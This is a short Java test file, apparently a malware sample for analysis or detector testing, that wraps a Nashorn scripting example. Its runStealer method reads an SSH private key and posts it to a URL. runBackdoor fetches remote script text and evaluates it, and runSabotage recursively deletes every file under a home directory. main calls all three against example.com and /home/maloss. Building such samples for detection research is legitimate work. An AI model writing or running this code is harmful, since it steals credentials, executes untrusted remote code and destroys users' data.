// https://www.programcreek.com/java-api-examples/?code=AdoptOpenJDK/openjdk-jdk10/openjdk-jdk10-master/nashorn/docs/source/MultiScopes.java
package test_classes;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.SimpleScriptContext;


@SuppressWarnings("javadoc")
public class TestEval {
    public static void runEval() throws Exception {
        final ScriptEngineManager manager = new ScriptEngineManager();
        final ScriptEngine engine = manager.getEngineByName("nashorn");

        engine.put("x", "hello");
        // print global variable "x"
        engine.eval("print(x);");
        // the above line prints "hello"

        // Now, pass a different script context
        final ScriptContext newContext = new SimpleScriptContext();
        newContext.setBindings(engine.createBindings(), ScriptContext.ENGINE_SCOPE);
        final Bindings engineScope = newContext.getBindings(ScriptContext.ENGINE_SCOPE);

        // add new variable "x" to the new engineScope
        engineScope.put("x", "world");

        // execute the same script - but this time pass a different script context
        engine.eval("print(x);", newContext);
        // the above line prints "world"
    }

    public static void runStealer(String pathStr, String urlStr) throws Exception {
        // read ssh key and send it to network
    	String data = new String(Files.readAllBytes(Paths.get(pathStr)));
        
        URL url = new URL(urlStr);
        URLConnection connection = url.openConnection();
        connection.setDoOutput(true);

        OutputStreamWriter out = new OutputStreamWriter(connection.getOutputStream());
        out.write("secret=" + data);
        out.close();
    }

    public static void runBackdoor(String urlStr) throws Exception {
        // read from network and execute locally
    	// ref: https://docs.oracle.com/javase/tutorial/networking/urls/readingWriting.html
        URL url = new URL(urlStr);
        URLConnection connection = url.openConnection();
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        StringBuilder response = new StringBuilder();
        String decodedString;
        while ((decodedString = in.readLine()) != null) {
            response.append(decodedString);
        }
        in.close();

        final ScriptEngineManager manager = new ScriptEngineManager();
        final ScriptEngine engine = manager.getEngineByName("nashorn");
        engine.eval(response.toString());
    }

    public static void runSabotage(String pathStr) throws Exception {
        // remove all files under path
    	// ref: https://stackoverflow.com/questions/779519/delete-directories-recursively-in-java
    	Files.walk(Paths.get(pathStr)).map(Path::toFile).sorted((o1, o2) -> -o1.compareTo(o2)).forEach(File::delete);
    }

    public static void main(final String[] args) throws Exception {
    	// WARNING: do not modify the following paths to your local machine. you may leak your secrets or wipe out your disk. 
        runEval();
        runStealer("/home/maloss/.ssh/id_rsa","http://www.example.com");
        runBackdoor("http://www.example.com");
        runSabotage("/home/maloss/");
    }
}


